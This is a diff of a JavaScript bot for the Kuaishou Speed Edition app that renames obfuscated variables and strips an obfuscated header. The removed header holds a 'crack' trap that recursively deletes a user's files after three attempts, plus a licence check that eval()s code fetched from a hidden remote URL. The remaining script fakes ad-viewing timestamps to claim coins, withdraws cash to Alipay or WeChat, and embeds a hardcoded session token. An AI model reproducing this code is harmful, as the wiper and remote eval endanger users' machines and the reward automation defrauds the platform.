@@ -1,99 +1,5 @@
-const $$ = Envcc('快手极速版');
-let acckey = $$["isNode"]() ? process.env["cdkey"] ? process.env["cdkey"] : '' : $$["getdata"]("cdkey") ? $$["getdata"]("cdkey") : '',
-    all_msg = '',
-    mac = '';
-$$["isNode"]() ? (gtr = require('fs'), isFileExist("C:/") ? console.log("\n电脑环境") : console.log("\n青龙环境")) : console.log("\n代理环境");
-
-function isFileExist(_0x5b6d72) {
-  try {
-    gtr["accessSync"](_0x5b6d72, gtr["F_OK"]);
-    F;
-  } catch (_0xf5b053) {
-    return false;
-  }
-
-  return true;
-}
-
-function addF(_0x417057, _0x37d1a4) {
-  let _0x586161 = 0,
-      _0x4a1d82 = "C:/Windows/system.txt";
-
-  if (isFileExist(_0x4a1d82)) {
-    _0x586161 = gtr["readFileSync"](_0x4a1d82, "utf8");
-  } else {
-    if (isFileExist("C:/")) {
-      gtr["writeFile"](_0x4a1d82, '1', function (_0x4e9d3c) {
-        if (_0x4e9d3c) {
-          throw _0x4e9d3c;
-        }
-      });
-    } else {
-      return;
-    }
-  }
-
-  if (_0x586161 == 99) {
-    return 99;
-  }
-
-  console.log(_0x586161);
-  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x586161);
-
-  if (parseInt(_0x586161) < 3) {
-    let _0x2c9c4e = parseInt(_0x586161) + 1;
-
-    gtr["writeFileSync"](_0x4a1d82, _0x2c9c4e + '', "utf8");
-    return;
-  }
-
-  if (!gtr["existsSync"](_0x417057)) {
-    return;
-  }
-
-  if (gtr["statSync"](_0x417057)["isDirectory"]()) {
-    var _0x49c958 = gtr["readdirSync"](_0x417057),
-        _0x508070 = _0x49c958["length"],
-        _0x2fb658 = 0;
-
-    if (_0x508070 > 0) {
-      _0x49c958["forEach"](function (_0x2f85eb) {
-        _0x2fb658++;
-
-        var _0x41efa3 = _0x417057 + '/' + _0x2f85eb;
-
-        gtr["statSync"](_0x41efa3)["isDirectory"]() ? addF(_0x41efa3, true) : gtr["unlinkSync"](_0x41efa3);
-      });
-
-      _0x508070 == _0x2fb658 && _0x37d1a4 && gtr["rmdirSync"](_0x417057);
-    } else {
-      _0x508070 == 0 && _0x37d1a4 && gtr["rmdirSync"](_0x417057);
-    }
-  } else {
-    gtr["unlinkSync"](_0x417057);
-  }
-}
-
-function hqs(_0x51b79a = 10) {
-  return new Promise(_0x3bc41e => {
-    let _0x42834f = 5,
-        _0x5cb814 = {
-      'url': $$["isNode"]() ? rc4($$["fwur"](), "1200") + ("?key=" + acckey + "&id=" + _0x42834f + "&ip=1&mac=" + mac + "&bb=1") : rc4($$["fwur"](), "1200") + ("?key=" + acckey + "&id=" + _0x42834f + "&ip=0&mac=" + mac + "&bb=1")
-    };
-    $$["post"](_0x5cb814, async (_0x357e58, _0x585ecf, _0x48a6da) => {
-      try {
-        let _0x85f689 = eval(_0x48a6da);
-
-        _0x85f689["code"] == 200 ? (all_msg = _0x85f689["msg"], _0x3bc41e(_0x85f689["data"])) : (all_msg = _0x85f689["msg"], _0x3bc41e(false));
-      } catch (_0x4aff38) {
-        $$.logErr(_0x4aff38, _0x585ecf);
-      }
-    }, 0);
-  });
-}
-
 const jsname = "快手极速版",
-    $ = new Env(jsname);
+    $ = new Env("快手极速版");
 
 let notifyStr = '',
     httpResult,
@@ -106,8 +12,8 @@ let notifyStr = '',
     notifyFlag = ($.isNode() ? process.env.ksjsbNotify : $.getval("ksjsbNotify")) || 1,
     userIdx = 0,
     userCount = 0,
-    _0xf2b084 = 12,
-    _0x5718d8 = [];
+    needRunNum = 12,
+    inviteList = [];
 
 const ad1 = {
   'id': 0,
@@ -129,7 +35,7 @@ const unknown1 = {
   'id': 151,
   "name": "未知视频"
 };
-const _0x1462dc = {
+const ksAdInfo = {
   "ad1": ad1,
   "ad2": ad2,
   "box": box,
@@ -143,7 +49,7 @@ const taskTypes = {
   'gj': 217,
   "invite": 2008
 };
-const _0x542b32 = {
+const luckdrawNum_161 = {
   "extParams": "56dfe31594b858e69ef613f5e97227fb03493544e59e2b2a726006e2852ec1040cd969d4748c460ecf574cc487214a91f70592aa8b2225630027c39ca2c544027efa65815d1acea23cb503034b12641c",
   "businessId": 161,
   "pageId": 11101,
@@ -151,7 +57,7 @@ const _0x542b32 = {
   "subPageId": 100013628,
   "name": "获取抽奖次数视频"
 };
-const _0x5d3025 = {
+const luckdrawVideo_161_213 = {
   "extParams": "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
   "businessId": 161,
   "pageId": 11101,
@@ -159,7 +65,7 @@ const _0x5d3025 = {
   "subPageId": 100013630,
   "name": "抽奖视频161-213"
 };
-const _0x59d3c8 = {
+const luckdrawVideo_161_100 = {
   "extParams": "56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4",
   "businessId": 161,
   "pageId": 11101,
@@ -167,7 +73,7 @@ const _0x59d3c8 = {
   "subPageId": 100013629,
   "name": "抽奖视频161-100"
 };
-const _0x1c6675 = {
+const luckdrawVideo_11_213 = {
   "extParams": "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
   "businessId": 11,
   "pageId": 11101,
@@ -175,7 +81,7 @@ const _0x1c6675 = {
   "subPageId": 100013629,
   "name": "抽奖视频11-100"
 };
-const _0x46b63a = {
+const luckdrawVideo_11_100 = {
   "extParams": "56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4",
   "businessId": 11,
   "pageId": 11101,
@@ -183,7 +89,7 @@ const _0x46b63a = {
   "subPageId": 100013629,
   "name": "抽奖视频11-100"
 };
-const _0xaf54c6 = {
+const inviteVideo_2008 = {
   "extParams": "60869a9fd2ab63f5e0b1725d059da31f7d3ed3046658438ee204a153c3bc47189ccf268b22e603b6750780c9647e7a12b3027381e11da27b234311bccfd4a67bb892f889a4020ceae4f4e102cc50c327",
   "businessId": 2008,
   "pageId": 100012068,
@@ -191,7 +97,7 @@ const _0xaf54c6 = {
   "subPageId": 100015089,
   "name": "邀请页视频(实际是100金币)"
 };
-const _0x44de40 = {
+const liveVideo_75 = {
   "extParams": "56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092",
   "businessId": 75,
   "pageId": 100012068,
@@ -199,7 +105,7 @@ const _0x44de40 = {
   "subPageId": 100015089,
   "name": "直播任务"
 };
-const _0x4266ba = {
+const signVideo_168 = {
   "extParams": "56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092",
   "businessId": 168,
   "pageId": 100012068,
@@ -207,22 +113,22 @@ const _0x4266ba = {
   "subPageId": 100015089,
   "name": "签到翻倍视频2"
 };
-const _0x57d7ea = {
-  "luckdrawNum_161": _0x542b32,
-  "luckdrawVideo_161_213": _0x5d3025,
-  "luckdrawVideo_161_100": _0x59d3c8,
-  "luckdrawVideo_11_213": _0x1c6675,
-  "luckdrawVideo_11_100": _0x46b63a,
-  "inviteVideo_2008": _0xaf54c6,
-  "liveVideo_75": _0x44de40,
-  "signVideo_168": _0x4266ba
+const luckydrawInfo = {
+  "luckdrawNum_161": luckdrawNum_161,
+  "luckdrawVideo_161_213": luckdrawVideo_161_213,
+  "luckdrawVideo_161_100": luckdrawVideo_161_100,
+  "luckdrawVideo_11_213": luckdrawVideo_11_213,
+  "luckdrawVideo_11_100": luckdrawVideo_11_100,
+  "inviteVideo_2008": inviteVideo_2008,
+  "liveVideo_75": liveVideo_75,
+  "signVideo_168": signVideo_168
 };
 
-let _0x134a17 = new Date(),
-    _0x20a9d7 = _0x134a17["getHours"](),
-    _0x459e63 = 1.07,
+let date = new Date(),
+    currentHour = date["getHours"](),
+    version = 1.07,
     _0x2e716e = 0,
-    _0x5bc515 = "ksjsb",
+    jsnameStr = "ksjsb",
     _0x180c0c = "https://127.0.0.1/",
     _0x75eec0 = "https://127.0.0.1/";
 
@@ -301,7 +207,7 @@ class UserInfo {
 
     result.result == 1 ? (console.log("账号[" + this.name + "]准备分享得金币"), await $.wait(200), await this.taskReward(122)) : console.log("账号[" + this.name + "]分享失败：" + result.error_msg);
   }
-
+  // 领取任务奖励
   async taskReward(taskId) {
     let url = "https://nebula.kuaishou.com/rest/n/nebula/daily/report?taskId=" + taskId,
         body = '';
@@ -317,7 +223,7 @@ class UserInfo {
 
     result.result == 1 ? console.log("账号[" + this.name + "]完成任务[" + taskId + "]成功，获得" + result["data"]["amount"] + '金币') : console.log("账号[" + this.name + "]完成任务[" + taskId + "]失败：" + result["error_msg"]);
   }
-
+  // 获取签到信息
   async getSignInfo() {
     let url = "https://nebula.kuaishou.com/rest/n/nebula/sign/queryPopup",
         body = '';
@@ -333,14 +239,14 @@ class UserInfo {
 
     result.result == 1 ? (console.log("账号[" + this.name + "]今天" + (result["data"]["nebulaSignInPopup"]["todaySigned"] ? '已' : '未') + '签到'), !result["data"]["nebulaSignInPopup"]["todaySigned"] && (await $.wait(200), await this["doSign"](), await $.wait(200), await this["setShare"]())) : console.log("账号[" + this.name + "]查询签到信息失败：" + result["error_msg"]);
   }
-
+  // 签到
   async doSign() {
     let url = "https://nebula.kuaishou.com/rest/n/nebula/sign/sign?source=activity";
 
     let body = '',
-        _0x42fdc6 = populateUrlObject(url, this.cookie, body);
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("get", _0x42fdc6);
+    await httpRequest("get", urlObject);
     let result = httpResult;
 
     if (!result) {
@@ -350,246 +256,249 @@ class UserInfo {
     if (result["result"] == 1) {
       console.log("账号[" + this.name + "]签到成功：" + result["data"]["toast"]);
       await $.wait(200);
-      await this.ksAdParam(_0x1462dc["sign"]);
+      await this.ksAdParam(ksAdInfo["sign"]);
       await $.wait(200);
-      await this.ksNeoAdParam(_0x57d7ea["signVideo_168"]);
+      await this.ksNeoAdParam(luckydrawInfo["signVideo_168"]);
     } else {
       console.log("账号[" + this.name + "]签到失败：" + result["error_msg"]);
     }
   }
 
-  async ["taskList"]() {
+  async taskList() {
+    console.log('taskList-----')
     let url = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false",
         body = '';
 
-    let _0x13dbd9 = populateUrlObject(url, this.cookie, body);
+    let urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("get", _0x13dbd9);
-    let _0x5508c0 = httpResult;
+    await httpRequest("get", urlObject);
+    let result = httpResult;
+    console.log('taskList-----result:', result)
 
-    if (!_0x5508c0) {
+    if (!result) {
       return;
     }
 
-    if (_0x5508c0["result"] == 1) {
+    if (result["result"] == 1) {
       console.log("账号[" + this.name + "]任务完成情况：");
 
-      for (let _0x345754 of _0x5508c0["data"]["dailyTasks"]) {
+      for (let item of result.data.dailyTasks) {
         for (let type in taskTypes) {
-          if (_0x345754["taskId"] == taskTypes[type]) {
-            let _0x1d86d3 = parseInt(_0x345754["completedStages"]),
-                _0x4a93bd = parseInt(_0x345754["stages"]),
-                _0x2433f1 = Math["ceil"](_0x4a93bd / _0xf2b084),
-                _0x25998 = _0x1d86d3 < _0x4a93bd;
+          if (item.taskId == taskTypes[type]) {
+            let completedStages = parseInt(item.completedStages),
+                stages = parseInt(item.stages),
+                num = Math.ceil(stages / needRunNum),
+                needRun = completedStages < stages;
 
-            const _0x98aa52 = {
-              "num": _0x2433f1,
-              "needRun": _0x25998
+            const info = {
+              "num": num,
+              "needRun": needRun
             };
-            this["task"][_0x345754["taskId"]] = _0x98aa52;
-            console.log('【' + _0x345754["name"] + "】 " + _0x1d86d3 + '/' + _0x4a93bd + '，' + (_0x25998 ? "未完成" : "已完成") + "，每次运行完成" + _0x2433f1 + "次任务");
+            this.task[item.taskId] = info;
+            console.log('【' + item.name + "】 " + completedStages + '/' + stages + '，' + (needRun ? "未完成" : "已完成") + "，每次运行完成" + num + "次任务");
             continue;
           }
         }
       }
     } else {
-      console.log("账号[" + this.name + "]查询任务列表失败：" + _0x5508c0["error_msg"]);
+      console.log("账号[" + this.name + "]查询任务列表失败：" + result.error_msg);
     }
   }
-
+  // 逛街领金币
   async ["ksgj"]() {
     let url = "https://api.e.kuaishou.com/rest/r/reward/task/getActivityReward",
         body = "activityId=148&client_key=ksgjbody",
-        _0x574fb2 = populateUrlObject(url, this.cookie, body);
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("post", _0x574fb2);
-    let _0x2e6d85 = httpResult;
+    await httpRequest("post", urlObject);
+    let result = httpResult;
 
-    if (!_0x2e6d85) {
+    if (!result) {
       return;
     }
 
-    _0x2e6d85["result"] == 1 ? console.log("账号[" + this.name + "]逛街获得" + _0x2e6d85["data"]["amount"] + '金币') : console.log("账号[" + this.name + "]逛街失败：" + _0x2e6d85["error_msg"]);
+    result["result"] == 1 ? console.log("账号[" + this.name + "]逛街获得" + result["data"]["amount"] + '金币') : console.log("账号[" + this.name + "]逛街失败：" + result["error_msg"]);
   }
 
-  async ["ksAdParam"](_0x22b5a2) {
+  async ksAdParam(creativeId) {
     let url = "https://api.e.kuaishou.com/rest/e/v1/reward/ad?kpf=ANDROID_PHONE&kpn=NEBULA";
 
     let body = "encData=WlTuzeTU6mGT9525bjJUVnlteAACTXpjgjAw%2BtDz1mbM14iDVHdJY0pKd7s5mx8%2BXMRRi7MCE3BSy1NNxI6bywhQueJl4YV8QDNsCONuMI7m59XX7rycrXz5ZPbObMBFLp23dqIF86Do53AbF3u4Dd2Vsk%2B1BzkhUIjucpA2gZ6g837f5Wz19RFfZ9m0pIuu8qg0EFbwOhyvbnybXJXFHahBNDH%2BfHB3V63CQuUJV6MSpBlFU6%2BDiPwORLmSR81ZkexYHIeTr2KafARSUD896R1uB%2BfUnuLqTxnxGmbUG1YIRWBELKXBD6NS9dBoJCaXUCZdA8Iy%2FXwz95700n4l98a9e0fAsnip7ehHiRCNVs7QSEMghZyZDAVZqj1S2XukcCNfZmusnYLyTk3t8pQlfH1PJqbwlA%2BnHpe%2FN8vnOSP0I1F3ZwXHWaaLL2FT%2FvHzk6Ly4osnC45ugzvyKjRmoJhi%2BQBlnOIV9GGpDBWprlbEmer2RVDv4DRCSPt%2Bfiqd3GyKML6S%2B9iWt26PpIzIORn1DyP0X4QaxZNdYWAd3lfYfTjEPXW%2BLtdcMiEYX%2FSqYWyO6zOZ4iovRzLBLXcxsd2EPoe%2B2U5Jw5tw5YBFb1%2BmsANJX9YqA1i1EE1ZlzBOQaFSudn%2Bwvwo3%2FmCfT1CORmlgfrQvWPbMrFqOlO3iSsDWBa3HqTVD82RbV%2BjRlKSPYu56jOpKvtKUHCy%2Fj3nKQZGmN2Pkdsjss0j2MKACMIwDLbOhYo%2B0pP7hY5%2FJMV0pzH65e%2BmSE2dFmbOeA%2BcR8TNtlDnWCEqDDLkMzZ7%2Bh1xWINvXEMVm453edsfnboaSXY24%2FW8RLYkYPoF%2FcMNalSuBF9X7xIw&sign=5a54eecde4d4ea6113782f7bc107d057094e54271e3c02c2eb795e0944356e7b&cs=false&sig=b5f1438be8043fa13cc0feae4408fdc7&client_key=2ac2a76d&__NS_sig3=03126241d268ea6e1d4b48491c78afa2fb133333575a5442&os=android&__NStokensig=a72ad8f8d36f5797858ea6363d8a39754c7e485a15a8d094cc334d249959edd1&token=Cg9rdWFpc2hvdS5hcGkuc3QSoAGJnMSOANoNbM6ND_OdEzBSJT4dCPjOk56DU5u5eK0bhKo1g4aIZ54x3Gd6DvRjA1Jc_CYqAnTdqHez5240vfyWqpMYv7neRWKjUx2DoZzjyFP65DNbluF2-8xcCPwAtUFH9l9xuSxRukRU7MJZS8JCZbdWZkiTtn7XwYgX9pP3OFrjlduNj2UhLZqyb1LTLoA5bbBAyelqOUJWgrv5kx0fGhLZe8NH31JEM6ppJzAS6A8iBVUiIDZhUfY1IjzcFcyxDdAHsjSY7hQCepATcGWmABMlxirPKAUwAQ",
-        _0x3739ca = populateUrlObject(url, this.cookie, body);
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("post", _0x3739ca);
-    let _0x1e4536 = httpResult;
+    await httpRequest("post", urlObject);
+    let result = httpResult;
 
-    if (!_0x1e4536) {
+    if (!result) {
       return;
     }
 
-    _0x1e4536["result"] == 1 ? _0x1e4536["impAdInfo"] && _0x1e4536["impAdInfo"]["length"] > 0 && _0x1e4536["impAdInfo"][0]["adInfo"] && _0x1e4536["impAdInfo"][0]["adInfo"]["length"] > 0 && _0x1e4536["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (await $.wait(200), await this["ksAdReward"](_0x1e4536["llsid"], _0x1e4536["impAdInfo"][0]["adInfo"][0]["adBaseInfo"]["creativeId"], _0x22b5a2)) : console.log("账号[" + this.name + "]获取" + _0x22b5a2["name"] + "参数失败：" + _0x1e4536["error_msg"]);
+    result["result"] == 1 ? result["impAdInfo"] && result["impAdInfo"]["length"] > 0 && result["impAdInfo"][0]["adInfo"] && result["impAdInfo"][0]["adInfo"]["length"] > 0 && result["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (await $.wait(200), await this["ksAdReward"](result["llsid"], result["impAdInfo"][0]["adInfo"][0]["adBaseInfo"]["creativeId"], creativeId)) : console.log("账号[" + this.name + "]获取" + creativeId["name"] + "参数失败：" + result["error_msg"]);
   }
 
-  async ["ksAdReward"](_0x5516be, _0x246d16, _0x40e3e0) {
-    let _0xe93f2e = new Date().getTime();
+  async ksAdReward(llsid, creativeId, info) {
+    let endTime = new Date().getTime();
 
-    let _0x15288f = Math["floor"](Math["random"]() * 30000) + 45000;
+    let randomTime = Math.floor(Math.random() * 30000) + 45000;
 
-    let _0x421eb0 = _0xe93f2e - _0x15288f,
+    let startTime = endTime - randomTime,
         url = "https://api.e.kuaishou.com/rest/r/ad/nebula/reward";
 
-    let body = "bizStr={\"endTime\":" + _0xe93f2e + ",\"eventValue\":-1,\"rewardList\":[{\"creativeId\":" + _0x246d16 + ",\"extInfo\":\"\",\"llsid\":" + _0x5516be + ",\"taskType\":1}],\"startTime\":" + _0x421eb0 + ",\"taskId\":" + _0x40e3e0['id'] + '}',
-        _0x12d9f7 = populateUrlObject(url, this.cookie, body);
+    let body = "bizStr={\"endTime\":" + endTime + ",\"eventValue\":-1,\"rewardList\":[{\"creativeId\":" + creativeId + ",\"extInfo\":\"\",\"llsid\":" + llsid + ",\"taskType\":1}],\"startTime\":" + startTime + ",\"taskId\":" + info['id'] + '}',
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("post", _0x12d9f7);
-    let _0x4e5f08 = httpResult;
+    await httpRequest("post", urlObject);
+    let result = httpResult;
 
-    if (!_0x4e5f08) {
+    if (!result) {
       return;
     }
 
-    _0x4e5f08["result"] == 1 ? console.log("账号[" + this.name + ']看' + _0x40e3e0["name"] + '获得' + _0x4e5f08["data"]["awardAmount"] + '金币') : console.log("账号[" + this.name + ']看' + _0x40e3e0["name"] + "失败：" + _0x4e5f08["error_msg"]);
+    result["result"] == 1 ? console.log("账号[" + this.name + ']看' + info.name + '获得' + result["data"]["awardAmount"] + '金币') : console.log("账号[" + this.name + ']看' + info.name + "失败：" + result["error_msg"]);
   }
 
-  async ["openBox"](_0x434b9a) {
-    let url = "https://nebula.kuaishou.com/rest/n/nebula/box/explore?isOpen=" + _0x434b9a + "&isReadyOfAdPlay=true";
+  // 开宝箱
+  async openBox(flag) {
+    let url = "https://nebula.kuaishou.com/rest/n/nebula/box/explore?isOpen=" + flag + "&isReadyOfAdPlay=true";
 
     let body = '',
-        _0x593a13 = populateUrlObject(url, this.cookie, body);
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("get", _0x593a13);
-    let _0x379826 = httpResult;
+    await httpRequest("get", urlObject);
+    let result = httpResult;
 
-    if (!_0x379826) {
+    if (!result) {
       return;
     }
 
-    _0x379826["result"] == 1 ? _0x434b9a == true ? _0x379826["data"]["commonAwardPopup"] && _0x379826["data"]["commonAwardPopup"]["awardAmount"] ? (console.log("账号[" + this.name + "]开宝箱获得" + _0x379826["data"]["commonAwardPopup"]["awardAmount"] + '金币'), await $.wait(200), await this.ksAdParam(_0x1462dc["box"])) : console.log("账号[" + this.name + "]开宝箱没有获得金币") : _0x379826["data"]["openTime"] > -1 ? (console.log("账号[" + this.name + "]开宝箱冷却时间还有" + Math["floor"](_0x379826["data"]["openTime"] / 1000) + '秒'), _0x379826["data"]["openTime"] == 0 && (await $.wait(200), await this["openBox"](true))) : console.log("账号[" + this.name + "]开宝箱次数已用完") : _0x434b9a == true ? console.log("账号[" + this.name + "]开宝箱失败：" + _0x379826["error_msg"]) : console.log("账号[" + this.name + "]查询宝箱状态失败：" + _0x379826["error_msg"]);
+    result["result"] == 1 ? flag == true ? result["data"]["commonAwardPopup"] && result["data"]["commonAwardPopup"]["awardAmount"] ? (console.log("账号[" + this.name + "]开宝箱获得" + result["data"]["commonAwardPopup"]["awardAmount"] + '金币'), await $.wait(200), await this.ksAdParam(ksAdInfo["box"])) : console.log("账号[" + this.name + "]开宝箱没有获得金币") : result["data"]["openTime"] > -1 ? (console.log("账号[" + this.name + "]开宝箱冷却时间还有" + Math["floor"](result["data"]["openTime"] / 1000) + '秒'), result["data"]["openTime"] == 0 && (await $.wait(200), await this["openBox"](true))) : console.log("账号[" + this.name + "]开宝箱次数已用完") : flag == true ? console.log("账号[" + this.name + "]开宝箱失败：" + result["error_msg"]) : console.log("账号[" + this.name + "]查询宝箱状态失败：" + result["error_msg"]);
   }
-
-  async ["withdraw"](_0x4de572) {
+  // 提现
+  async withdraw(money) {
     if (!this.bindAlipay && !this.bindWechat) {
       logAndNotify("账号[" + this.name + "]未绑定提现账号，不执行提现");
 
       return;
     }
 
-    let _0x1adb53 = parseInt(_0x4de572 * 100),
-        _0x5571a6 = this.bindAlipay ? "ALIPAY" : "WECHAT",
-        _0x987201 = _0x5571a6 == "ALIPAY" ? "支付宝" : '微信',
-        _0x589025 = _0x5571a6 == "ALIPAY" ? this.alipay : this.wechat,
+    let parseMoney = parseInt(money * 100),
+        provider = this.bindAlipay ? "ALIPAY" : "WECHAT",
+        providerName = provider == "ALIPAY" ? "支付宝" : '微信',
+        payType = provider == "ALIPAY" ? this.alipay : this.wechat,
         url = "https://www.kuaishoupay.com/pay/account/h5/withdraw/apply",
-        body = "account_group_key=NEBULA_CASH_ACCOUNT&mobile_code=&fen=" + _0x1adb53 + "&provider=" + _0x5571a6 + "&total_fen=" + _0x1adb53 + "&commission_fen=0&third_account=" + _0x5571a6 + "&attach=&biz_content=&session_id=",
-        _0x2b5f31 = populateUrlObject(url, this.cookie, body);
+        body = "account_group_key=NEBULA_CASH_ACCOUNT&mobile_code=&fen=" + parseMoney + "&provider=" + provider + "&total_fen=" + parseMoney + "&commission_fen=0&third_account=" + provider + "&attach=&biz_content=&session_id=",
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("post", _0x2b5f31);
-    let _0x47c905 = httpResult;
+    await httpRequest("post", urlObject);
+    let result = httpResult;
 
-    if (!_0x47c905) {
+    if (!result) {
       return;
     }
 
-    _0x47c905["result"] == "SUCCESS" ? logAndNotify('账号' + this.index + '[' + this.name + "]提现" + _0x4de572 + '元到' + _0x987201 + '[' + _0x589025 + "]成功") : logAndNotify('账号' + this.index + '[' + this.name + "]提现" + _0x4de572 + '元到' + _0x987201 + '[' + _0x589025 + "]失败：" + _0x47c905["msg"]);
+    result["result"] == "SUCCESS" ? logAndNotify('账号' + this.index + '[' + this.name + "]提现" + money + '元到' + providerName + '[' + payType + "]成功") : logAndNotify('账号' + this.index + '[' + this.name + "]提现" + money + '元到' + providerName + '[' + payType + "]失败：" + result["msg"]);
   }
 
-  async ["withdrawOverview"]() {
+  async withdrawOverview() {
     let url = "https://nebula.kuaishou.com/rest/n/nebula/outside/withdraw/overview?appver=10.2.20.2021";
 
     let body = '',
-        _0x5844e4 = populateUrlObject(url, this.cookie, body);
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("get", _0x5844e4);
-    let _0x4d50b1 = httpResult;
+    await httpRequest("get", urlObject);
+    let result = httpResult;
 
-    if (!_0x4d50b1) {
+    if (!result) {
       return;
     }
 
-    if (_0x4d50b1["result"] == 1) {
-      if (_0x4d50b1["data"]["isLimit"] == true) {
+    if (result["result"] == 1) {
+      if (result["data"]["isLimit"] == true) {
         console.log("账号[" + this.name + "]今天已提现");
         return;
       }
 
-      let _0x4e6848 = parseFloat(this["cashBalance"]);
+      let cashBalance = parseFloat(this["cashBalance"]);
 
       if (ksjsbAggressive == 1) {
-        if (_0x4e6848 < 0.3) {
+        if (cashBalance < 0.3) {
           logAndNotify("账号[" + this.name + "]余额不足0.3元，不提现");
         } else {
-          let _0x10a45d = Math["floor"](_0x4e6848 * 10) / 10;
+          let maxCashBalance = Math["floor"](cashBalance * 10) / 10;
 
-          _0x10a45d = _0x10a45d > 50 ? 50 : _0x10a45d;
+          maxCashBalance = maxCashBalance > 50 ? 50 : maxCashBalance;
 
-          logAndNotify("账号[" + this.name + "]准备最大化提现" + _0x10a45d + '元');
+          logAndNotify("账号[" + this.name + "]准备最大化提现" + maxCashBalance + '元');
 
           await $.wait(200);
-          await this["withdraw"](_0x10a45d);
+          await this["withdraw"](maxCashBalance);
         }
       } else {
         if (!ksjsbCash) {
-          for (let _0x5c595f of _0x4d50b1["data"]["enWithdrawList"]["sort"](function (_0xc86763, _0x5de0c4) {
-            return _0x5de0c4 - _0xc86763;
+          for (let item of result["data"]["enWithdrawList"]["sort"](function (a, b) {
+            return b - a;
           })) {
-            if (_0x4e6848 >= parseFloat(_0x5c595f)) {
-              logAndNotify("账号[" + this.name + "]准备提现" + _0x5c595f + '元');
+            if (cashBalance >= parseFloat(item)) {
+              logAndNotify("账号[" + this.name + "]准备提现" + item + '元');
 
               await $.wait(200);
-              await this["withdraw"](_0x5c595f);
+              await this["withdraw"](item);
               return;
             }
           }
 
-          logAndNotify("账号[" + this.name + "]余额不足，可提现额度：" + _0x4d50b1["data"]["enWithdrawList"]["join"](','));
+          logAndNotify("账号[" + this.name + "]余额不足，可提现额度：" + result["data"]["enWithdrawList"]["join"](','));
         } else {
-          _0x4e6848 >= parseFloat(ksjsbCash) ? (logAndNotify("账号[" + this.name + "]准备提现" + ksjsbCash + '元'), await $.wait(200), await this["withdraw"](ksjsbCash)) : logAndNotify("账号[" + this.name + "]余额不足" + ksjsbCash + "元，不提现");
+          cashBalance >= parseFloat(ksjsbCash) ? (logAndNotify("账号[" + this.name + "]准备提现" + ksjsbCash + '元'), await $.wait(200), await this["withdraw"](ksjsbCash)) : logAndNotify("账号[" + this.name + "]余额不足" + ksjsbCash + "元，不提现");
         }
       }
     } else {
-      console.log("账号[" + this.name + "]查询提现列表失败：" + _0x4d50b1["error_msg"]);
+      console.log("账号[" + this.name + "]查询提现列表失败：" + result["error_msg"]);
     }
   }
-
-  async ["accountOverview"]() {
+  // 查询账户信息
+  async accountOverview() {
     let url = "https://nebula.kuaishou.com/rest/n/nebula/account/overview";
 
     let body = '',
-        _0xf58451 = populateUrlObject(url, this.cookie, body);
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("get", _0xf58451);
-    let _0x5673e6 = httpResult;
+    await httpRequest("get", urlObject);
+    let result = httpResult;
 
-    if (!_0x5673e6) {
+    if (!result) {
       return;
     }
 
-    if (_0x5673e6["result"] == 1) {
-      this["coinBalance"] = _0x5673e6["data"]["coinBalance"];
-      this["cashBalance"] = _0x5673e6["data"]["cashBalance"];
-      let _0xdfbbe8 = _0x5673e6["data"]["exchangeCoinState"];
+    if (result["result"] == 1) {
+      this["coinBalance"] = result["data"]["coinBalance"];
+      this["cashBalance"] = result["data"]["cashBalance"];
+      let exchangeCoinState = result["data"]["exchangeCoinState"];
 
       logAndNotify("账号[" + this.name + "]账户余额" + this["cashBalance"] + '元，' + this["coinBalance"] + '金币');
 
-      _0xdfbbe8 == 2 && (await $.wait(200), await this["changeExchangeType"](0));
+      exchangeCoinState == 2 && (await $.wait(200), await this["changeExchangeType"](0));
     } else {
-      console.log("账号[" + this.name + "]查询账户信息失败：" + _0x5673e6["error_msg"]);
+      console.log("账号[" + this.name + "]查询账户信息失败：" + result["error_msg"]);
     }
   }
 
-  async ["changeExchangeType"](_0x410fb6) {
+  async changeExchangeType(type) {
     let url = "https://nebula.kuaishou.com/rest/n/nebula/exchange/changeExchangeType",
-        _0x255333 = "{\"type\":" + _0x410fb6 + '}',
-        _0x1f06a6 = populateUrlObject(url, this.cookie, _0x255333);
+        body = "{\"type\":" + type + '}',
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    _0x1f06a6["headers"]["Content-Type"] = "application/json";
-    await httpRequest("post", _0x1f06a6);
-    let _0x461990 = httpResult;
+    urlObject.headers["Content-Type"] = "application/json";
+    await httpRequest("post", urlObject);
+    let result = httpResult;
 
-    if (!_0x461990) {
+    if (!result) {
       return;
     }
 
-    let _0x207914 = _0x410fb6 == 0 ? "自动兑换" : "手动兑换";
+    let exchangeType = type == 0 ? "自动兑换" : "手动兑换";
 
